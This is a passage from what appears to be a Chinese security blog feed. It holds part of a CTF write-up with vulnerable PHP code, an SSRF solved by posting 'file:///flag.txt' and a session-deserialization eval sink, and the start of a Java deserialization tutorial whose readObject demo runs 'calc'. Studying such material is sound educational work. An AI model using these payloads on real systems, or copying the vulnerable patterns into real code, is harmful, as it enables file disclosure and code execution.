href="#ÊêúÁ¥¢‰∏Ä‰∏ã" class="headerlink" title="ÊêúÁ¥¢‰∏Ä‰∏ã"></a>ÊêúÁ¥¢‰∏Ä‰∏ã</h4><p>SSRF‰ΩøÁî®fileÂçèËÆÆÂç≥ÂèØ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">geturl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$output</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;b>flagÂú®/flag.txt&lt;/b>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">geturl</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"    &lt;!DOCTYPE html>    &lt;html>    &lt;head>    &lt;meta charset='UTF-8'>&lt;/head>&lt;body>&lt;form method='post'>&lt;input type='text' name='url' placeholder='ËæìÂÖ•ÁΩëÂùÄ'>&lt;input type='submit' name='submit' placeholder='Êèê‰∫§'>&lt;/form>&lt;/body>    &lt;/html>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span>url<span class="token operator">=</span>file<span class="token punctuation">:</span><span class="token comment">///flag.txt</span></code></pre><h4 id="‰Ω†Áü•ÈÅìSESSIONÂêó-sessionÂèçÂ∫èÂàóÂåñÈÄÉÈÄ∏"><a href="#‰Ω†Áü•ÈÅìSESSIONÂêó-sessionÂèçÂ∫èÂàóÂåñÈÄÉÈÄ∏" class="headerlink" title="‰Ω†Áü•ÈÅìSESSIONÂêó(sessionÂèçÂ∫èÂàóÂåñÈÄÉÈÄ∏)"></a>‰Ω†Áü•ÈÅìSESSIONÂêó(sessionÂèçÂ∫èÂàóÂåñÈÄÉÈÄ∏)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">HelloEva</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Welcome To Eva Word~"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HelloEva</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># Look Look session.php?</span><span class="token delimiter important">?></span></span></code></pre><p>session.php</p><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php_serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'session'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'session'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'session'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><code>ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);</code>ÔºöËÆæÁΩÆ‰ºöËØùÂ∫èÂàóÂåñÂ§ÑÁêÜÂô®‰∏∫‚Äôphp_serialize‚ÄôÔºåËøôÊÑèÂë≥ÁùÄ‰ºöËØùÊï∞ÊçÆÂ∞Ü‰ΩøÁî®PHPÁöÑÂ∫èÂàóÂåñÊú∫Âà∂ËøõË°åÂ≠òÂÇ®„ÄÇ</p>]]></content>
      
      
      <categories>
          
          <category> ÂÆâÂÖ®Áõ∏ÂÖ≥ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Âæ°ÂÆõÊùØ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVAÂÆâÂÖ®Âü∫Á°Ä-- Â∫èÂàóÂåñ‰∏éÂèçÂ∫èÂàóÂåñ</title>
      <link href="/2024/09/08/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-3/"/>
      <url>/2024/09/08/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-3/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-ÂâçË®Ä"><a href="#0x01-ÂâçË®Ä" class="headerlink" title="0x01 ÂâçË®Ä"></a>0x01 ÂâçË®Ä</h3><ul><li>‰ªÄ‰πàÊòØÂ∫èÂàóÂåñ‰∏éÂèçÂ∫èÂàóÂåñÔºü</li><li>Â∫èÂàóÂåñ‰∏éÂèçÂ∫èÂàóÂåñÁöÑÂÖ≥ÈîÆÂáΩÊï∞Ôºü</li><li>ÂèçÂ∫èÂàóÂåñËøáÂêéÁöÑÊï∞ÊçÆÊúâÂï•ÁâπÂæÅ?</li><li>javaÂèçÂ∫èÂàóÂåñÊºèÊ¥û‰∏éphpÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁöÑÁõ∏‰ºº‰πãÂ§Ñ?</li></ul><p><a href="https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%9F%BA%E7%A1%80/Java-%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.md">Java-Â∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñ</a></p><p><a href="https://www.javasec.org/javase/JavaDeserialization/Serialization.html">JavaÂ∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñ</a></p><p>ÂÖ∂ÂÆûjavaÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁöÑÂéüÁêÜÂæàÁÆÄÂçïÔºåÂè™ÊòØÂêÑ‰∏™POPÈìæÊØîËæÉÂ§çÊùÇ„ÄÇ</p><h3 id="0x02-Ê¶ÇÂøµ"><a href="#0x02-Ê¶ÇÂøµ" class="headerlink" title="0x02 Ê¶ÇÂøµ"></a>0x02 Ê¶ÇÂøµ</h3><p>Êàë‰ª¨Áü•ÈÅìÔºåÂΩì‰∏§‰∏™ËøõÁ®ãËøõË°åËøúÁ®ãÈÄö‰ø°Êó∂ÔºåÂèØ‰ª•Áõ∏‰∫íÂèëÈÄÅÂêÑÁßçÁ±ªÂûãÁöÑÊï∞ÊçÆÔºåÂåÖÊã¨ÊñáÊú¨„ÄÅÂõæÁâá„ÄÅÈü≥È¢ë„ÄÅËßÜÈ¢ëÁ≠âÔºå ËÄåËøô‰∫õÊï∞ÊçÆÈÉΩ‰ºö‰ª•‰∫åËøõÂà∂Â∫èÂàóÁöÑÂΩ¢ÂºèÂú®ÁΩëÁªú‰∏ä‰º†ÈÄÅ„ÄÇÈÇ£‰πàÂΩì‰∏§‰∏™JavaËøõÁ®ãËøõË°åÈÄö‰ø°Êó∂ÔºåËÉΩÂê¶ÂÆûÁé∞ËøõÁ®ãÈó¥ÁöÑÂØπË±°‰º†ÈÄÅÂë¢ÔºüÁ≠îÊ°àÊòØÂèØ‰ª•ÁöÑ„ÄÇÂ¶Ç‰ΩïÂÅöÂà∞Âë¢ÔºüËøôÂ∞±ÈúÄË¶ÅJavaÂ∫èÂàóÂåñ‰∏éÂèçÂ∫èÂàóÂåñ‰∫Ü„ÄÇÊç¢Âè•ËØùËØ¥Ôºå‰∏ÄÊñπÈù¢ÔºåÂèëÈÄÅÊñπÈúÄË¶ÅÊääËøô‰∏™JavaÂØπË±°ËΩ¨Êç¢‰∏∫Â≠óËäÇÂ∫èÂàóÔºåÁÑ∂ÂêéÂú®ÁΩëÁªú‰∏ä‰º†ÈÄÅÔºõÂè¶‰∏ÄÊñπÈù¢ÔºåÊé•Êî∂ÊñπÈúÄË¶Å‰ªéÂ≠óËäÇÂ∫èÂàó‰∏≠ÊÅ¢Â§çÂá∫JavaÂØπË±°„ÄÇ</p><p> ÂΩìÊàë‰ª¨ÊòéÊô∞‰∫Ü‰∏∫‰ªÄ‰πàÈúÄË¶ÅJavaÂ∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñÂêéÔºåÊàë‰ª¨ÂæàËá™ÁÑ∂Âú∞‰ºöÊÉ≥JavaÂ∫èÂàóÂåñÁöÑÂ•ΩÂ§Ñ„ÄÇÂÖ∂Â•ΩÂ§Ñ‰∏ÄÊòØÂÆûÁé∞‰∫ÜÊï∞ÊçÆÁöÑÊåÅ‰πÖÂåñÔºåÈÄöËøáÂ∫èÂàóÂåñÂèØ‰ª•ÊääÊï∞ÊçÆÊ∞∏‰πÖÂú∞‰øùÂ≠òÂà∞Á°¨Áõò‰∏äÔºàÈÄöÂ∏∏Â≠òÊîæÂú®Êñá‰ª∂ÈáåÔºâÔºå‰∫åÊòØÔºåÂà©Áî®Â∫èÂàóÂåñÂÆûÁé∞ËøúÁ®ãÈÄö‰ø°ÔºåÂç≥Âú®ÁΩëÁªú‰∏ä‰º†ÈÄÅÂØπË±°ÁöÑÂ≠óËäÇÂ∫èÂàó„ÄÇ</p><p>‚ë† ÊÉ≥ÊääÂÜÖÂ≠ò‰∏≠ÁöÑÂØπË±°‰øùÂ≠òÂà∞‰∏Ä‰∏™Êñá‰ª∂‰∏≠ÊàñËÄÖÊï∞ÊçÆÂ∫ì‰∏≠Êó∂ÂÄôÔºõ<br>‚ë° ÊÉ≥Áî®Â•óÊé•Â≠óÂú®ÁΩëÁªú‰∏ä‰º†ÈÄÅÂØπË±°ÁöÑÊó∂ÂÄôÔºõ<br>‚ë¢ ÊÉ≥ÈÄöËøáRMI‰º†ËæìÂØπË±°ÁöÑÊó∂ÂÄô</p><p>‰∏Ä‰∫õÂ∫îÁî®Âú∫ÊôØÔºåÊ∂âÂèäÂà∞Â∞ÜÂØπË±°ËΩ¨ÂåñÊàê‰∫åËøõÂà∂ÔºåÂ∫èÂàóÂåñ‰øùËØÅ‰∫ÜËÉΩÂ§üÊàêÂäüËØªÂèñÂà∞‰øùÂ≠òÁöÑÂØπË±°„ÄÇ</p><p>ÁÆÄÂçïÊù•ËÆ≤ÔºåJavaÁöÑÂ∫èÂàóÂåñÊú∫Âà∂Â∞±ÊòØ‰∏∫‰∫ÜÊåÅ‰πÖÂåñÂ≠òÂÇ®Êüê‰∏™ÂØπË±°ÊàñËÄÖÂú®ÁΩëÁªú‰∏ä‰º†ËæìÊüê‰∏™ÂØπË±°„ÄÇÊàë‰ª¨ÈÉΩÁü•ÈÅìÔºå‰∏ÄÊó¶jvmÂÖ≥Èó≠ÔºåÈÇ£‰πàjava‰∏≠ÁöÑÂØπË±°‰πüÂ∞±ÈîÄÊØÅ‰∫ÜÔºåÊâÄ‰ª•Ë¶ÅÊÉ≥‰øùÂ≠òÂÆÉÔºåÂ∞±ÈúÄË¶ÅÊää‰ªñËΩ¨Êç¢‰∏∫Â≠óËäÇÂ∫èÂàóÂÜôÂà∞Êüê‰∏™Êñá‰ª∂ÊàñÊòØÂÖ∂ÂÆÉÂì™Èáå„ÄÇ</p><p>Â∫èÂàóÂåñÔºöÊääÂØπË±°ËΩ¨Êç¢‰∏∫Â≠óËäÇÂ∫èÂàó<br>ÂèçÂ∫èÂàóÂåñÔºöÊääÂ≠óËäÇÂ∫èÂàóËΩ¨Êç¢‰∏∫ÂØπË±°</p><h3 id="0x03-Á§∫‰æãËÆ≤Ëß£"><a href="#0x03-Á§∫‰æãËÆ≤Ëß£" class="headerlink" title="0x03 Á§∫‰æãËÆ≤Ëß£"></a>0x03 Á§∫‰æãËÆ≤Ëß£</h3><p>‰∏Ä‰∏™Á±ªÂØπË±°Ë¶ÅÊÉ≥ÂÆûÁé∞Â∫èÂàóÂåñÔºåÂøÖÈ°ªÊª°Ë∂≥‰∏§‰∏™Êù°‰ª∂Ôºö</p><p>1„ÄÅËØ•Á±ªÂøÖÈ°ªÂÆûÁé∞ java.io.Serializable ÂØπË±°„ÄÇ</p><p>2„ÄÅËØ•Á±ªÁöÑÊâÄÊúâÂ±ûÊÄßÂøÖÈ°ªÊòØÂèØÂ∫èÂàóÂåñÁöÑ„ÄÇ<del>Â¶ÇÊûúÊúâ‰∏Ä‰∏™Â±ûÊÄß‰∏çÊòØÂèØÂ∫èÂàóÂåñÁöÑÔºåÂàôËØ•Â±ûÊÄßÂøÖÈ°ªÊ≥®ÊòéÊòØÁü≠ÊöÇÁöÑ„ÄÇ</del></p><p>Ë¶ÅÂ∫èÂàóÂåñ‰∏Ä‰∏™ÂØπË±°ÔºåÈ¶ñÂÖàË¶ÅÂàõÂª∫OutputStreamÂØπË±°ÔºåÂÜçÂ∞ÜÂÖ∂Â∞ÅË£ÖÂú®‰∏Ä‰∏™ObjectOutputStreamÂØπË±°ÂÜÖÔºåÊé•ÁùÄÂè™ÈúÄË∞ÉÁî®writeObject()Âç≥ÂèØÂ∞ÜÂØπË±°Â∫èÂàóÂåñÔºåÂπ∂Â∞ÜÂÖ∂ÂèëÈÄÅÁªôOutputStreamÔºàÂØπË±°ÊòØÂü∫‰∫éÂ≠óËäÇÁöÑÔºåÂõ†Ê≠§Ë¶Å‰ΩøÁî®InputStreamÂíåOutputStreamÊù•ÁªßÊâøÂ±ÇÊ¨°ÁªìÊûÑÔºâ„ÄÇ</p><p>Ë¶ÅÂèçÂ∫èÂàóÂåñÂá∫‰∏Ä‰∏™ÂØπË±°ÔºåÈúÄË¶ÅÂ∞Ü‰∏Ä‰∏™InputStreamÂ∞ÅË£ÖÂú®ObjectInputStreamÂÜÖÔºåÁÑ∂ÂêéË∞ÉÁî®readObject()Âç≥ÂèØ„ÄÇ</p><p>ÁúãÊñáÂ≠ó‰∏çÂ§üÁõ¥ËßÇÔºåÂí±‰ª¨Áõ¥Êé•‰∏ä‰ª£Á†ÅÔºàÊ≥®ÊÑèÁúãÊ≥®ÈáäÔºâÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> user_ser<span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token string">"hsad"</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// ÂàõÂª∫‰∏Ä‰∏™FIleOutputStream</span>            <span class="token class-name">FileOutputStream</span> fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"./user.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// Â∞ÜËøô‰∏™FIleOutputStreamÂ∞ÅË£ÖÂà∞ObjectOutputStream‰∏≠</span>            <span class="token class-name">ObjectOutputStream</span> os <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fos<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// Ë∞ÉÁî®writeObjectÊñπÊ≥ïÔºåÂ∫èÂàóÂåñÂØπË±°Âà∞Êñá‰ª∂user.ser‰∏≠</span>            os<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ËØªÂèñÊï∞ÊçÆÔºö"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//  ÂàõÂª∫‰∏Ä‰∏™FIleInutputStream</span>            <span class="token class-name">FileInputStream</span> fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"./user.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// Â∞ÜFileInputStreamÂ∞ÅË£ÖÂà∞ObjectInputStream‰∏≠</span>            <span class="token class-name">ObjectInputStream</span> oi <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fis<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// Ë∞ÉÁî®readObject‰ªéuser.ser‰∏≠ÂèçÂ∫èÂàóÂåñÂá∫ÂØπË±°ÔºåËøòÈúÄË¶ÅËøõË°å‰∏Ä‰∏ãÁ±ªÂûãËΩ¨Êç¢ÔºåÈªòËÆ§ÊòØObjectÁ±ªÂûã</span>            <span class="token class-name">User</span> user1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">User</span><span class="token punctuation">)</span>oi<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            user1<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> <span class="token operator">|</span> <span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">float</span> height<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">,</span> <span class="token keyword">float</span> height<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>height <span class="token operator">=</span> height<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Name: "</span><span class="token operator">+</span>name<span class="token operator">+</span><span class="token string">", Age: "</span><span class="token operator">+</span>age<span class="token operator">+</span><span class="token string">", Height: "</span><span class="token operator">+</span>height<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//     private void readObject(ObjectInputStream input) throws IOException, ClassNotFoundException&#123;</span><span class="token comment">//         System.out.println("[*]ÊâßË°å‰∫ÜËá™ÂÆö‰πâÁöÑreadObjectÂáΩÊï∞");</span><span class="token comment">//         Runtime.getRuntime().exec("calc");</span><span class="token comment">//     &#125;</span><span class="token punctuation">&#125;</span></code></pre><p>Á®ãÂ∫èÊâßË°åËøáÂêé‰ºöÂú®ÂΩìÂâçÁõÆÂΩï‰∏ãÁîüÊàê‰∏Ä‰∏™user.serÊñá‰ª∂ÔºåÂπ∂‰∏îÂèçÂ∫èÂàóÂåñËøáÂêé‰ºöÊâßË°åinfoÊñπÊ≥ïÔºåÂú®ÁªàÁ´Ø‰∏äÊâìÂç∞Âá∫UserÁöÑ‰ø°ÊÅØÔºö</p><p><img src="1.png" loading="lazy"></p><p>ÂèØ‰ª•ÁúãÂà∞ÊåâÁÖßÈ¢ÑÊúüÊâßË°å‰∫ÜÔºåÊàêÂäüÁîüÊàê‰∫Ü‰∏Ä‰∏™user.serÊñá‰ª∂ÔºåËøô‰∏™Êñá‰ª∂ÈáåÂ≠òÊîæÁöÑÂ∞±ÊòØÂèçÂ∫èÂàóÂåñËøáÂêéÁöÑUserÁ±ªÂØπË±°ÔºåÊàë‰ª¨Áî®010Áúã‰∏Ä‰∏ãÂÜÖÂÆπ„ÄÇËøôÈáåÈúÄË¶ÅÊ≥®ÊÑèÁöÑÁâπÂæÅÂÄºÂ∞±ÊòØ16ËøõÂà∂ÊòæÁ§∫Êó∂ÁöÑÂâç32‰ΩçÔºö</p><p><img src="2.png" loading="lazy"></p><p>AC EDÔºöSTREAM_MAGICÔºåÂ£∞Êòé‰ΩøÁî®‰∫ÜÂ∫èÂàóÂåñÂçèËÆÆÔºå<strong>‰ªéËøôÈáåÂèØ‰ª•Âà§Êñ≠‰øùÂ≠òÁöÑÂÜÖÂÆπÊòØÂê¶‰∏∫Â∫èÂàóÂåñÊï∞ÊçÆ„ÄÇ</strong> ÔºàËøôÊòØÂú®ÈªëÁõíÊåñÊéòÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂæàÈáçË¶ÅÁöÑ‰∏Ä‰∏™ÁÇπÔºâ</p><p>00 05ÔºöSTREAM_VERSIONÔºåÂ∫èÂàóÂåñÂçèËÆÆÁâàÊú¨„ÄÇ</p><h3 id="0x04-ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂà©Áî®ÁÇπ"><a href="#0x04-ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂà©Áî®ÁÇπ" class="headerlink" title="0x04 ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂà©Áî®ÁÇπ"></a>0x04 ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂà©Áî®ÁÇπ</h3><p>‰∏äÈù¢Â∑≤ÁªèËØ¥ÂÆå‰∫ÜÂ∫èÂàóÂåñÁöÑÂü∫Á°Ä‰∫ÜÔºåÂ§ßÂÆ∂‰πüÂ∫îËØ•Áü•ÈÅìÂ¶Ç‰ΩïÂÆûÁé∞‰∏Ä‰∏™ÂØπË±°ÁöÑÂ∫èÂàóÂåñ‰∏éÂèçÂ∫èÂàóÂåñ‰∫ÜÔºåÈÇ£‰πàÔºåÊºèÊ¥ûÁÇπÂà∞Â∫ïÂú®Âì™ÈáåÂë¢?Â¶ÇÊûú‰Ω†‰∫ÜËß£phpÁöÑÂèçÂ∫èÂàóÂåñÔºåÈÇ£‰πàÂ∫îËØ•Áü•ÈÅìphpÂèçÂ∫èÂàóÂåñ‰∏Ä‰∏™ÂØπË±°Êó∂‰ºöËá™Âä®Ëß¶Âèë<code>__weakup</code>„ÄÅ<code>__destruct</code>Ëøô‰∫õÂáΩÊï∞ÔºåÂ¶ÇÊûúËøô‰∫õÂáΩÊï∞ÂΩì‰∏≠Êúâ‰∏Ä‰∫õÂç±Èô©ÁöÑÊìç‰ΩúÔºåÈÇ£‰πàÂ∞±ÂèØËÉΩÂØºËá¥ÊºèÊ¥ûÁöÑÂèëÁîüÔºåÂêåÊ†∑ÁöÑÔºåjavaÂèçÂ∫èÂàóÂåñÊó∂‰ºöËá™Âä®Ëß¶ÂèëreadObject()ÂáΩÊï∞,‰ΩÜÊòØ‰∏äÈù¢demo‰∏≠ÁöÑreadObject()ÂáΩÊï∞‰∏çÊòØObjectInputStreamÁöÑÊñπÊ≥ïÂêóÔºåÂºÄÂèëËÄÖÂèà‰∏çÂèØ‰ª•ÊéßÂà∂ÔºåÊÄé‰πà‰ºöÂØºËá¥ÊºèÊ¥ûÂë¢Ôºü</p><p>ÂÖ∂ÂÆûÔºåjavaÊòØÊîØÊåÅËá™ÂÆö‰πâreadObject‰∏éwriteObjectÊñπÊ≥ïÁöÑÔºåÂè™Ë¶ÅÊüê‰∏™Á±ª‰∏≠ÊåâÁÖßÁâπÂÆöÁöÑË¶ÅÊ±ÇÂÆûÁé∞‰∫ÜreadObjectÊñπÊ≥ïÔºåÈÇ£‰πàÂú®ÂèçÂ∫èÂàóÂåñÁöÑÊó∂ÂÄôÂ∞±‰ºöËá™Âä®Ë∞ÉÁî®ÂÆÉÔºåÂ¶ÇÊûúËøô‰∏™Ëá™ÂÆö‰πâÁöÑreadObjectÊñπÊ≥ïÈáåËøõË°å‰∫Ü‰∏Ä‰∫õÂç±Èô©Êìç‰ΩúÔºåÈÇ£‰πàÂ∞±‰ºöÂØºËá¥ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁöÑÂèëÁîü‰∫Ü„ÄÇËØïÈ™å‰∏Ä‰∏ãÔºöÊàë‰ª¨ËøòÊòØÁî®‰∏äÈù¢ÁöÑÁ±ªÔºå‰∏çËøáËøôÊ¨°Ëá™ÂÆö‰πâUserÁ±ªÁöÑreadObjectÊñπÊ≥ïÔºå‰πüÂ∞±ÊòØÂéªÊéâÊúÄÂêé‰∏ÄÁÇπ‰ª£Á†ÅÁöÑÊ≥®ÈáäÔºåÂÜçÊ¨°ÊâßË°åÔºåÊü•ÁúãÁªìÊûúÔºö</p><p><img src="3.png" 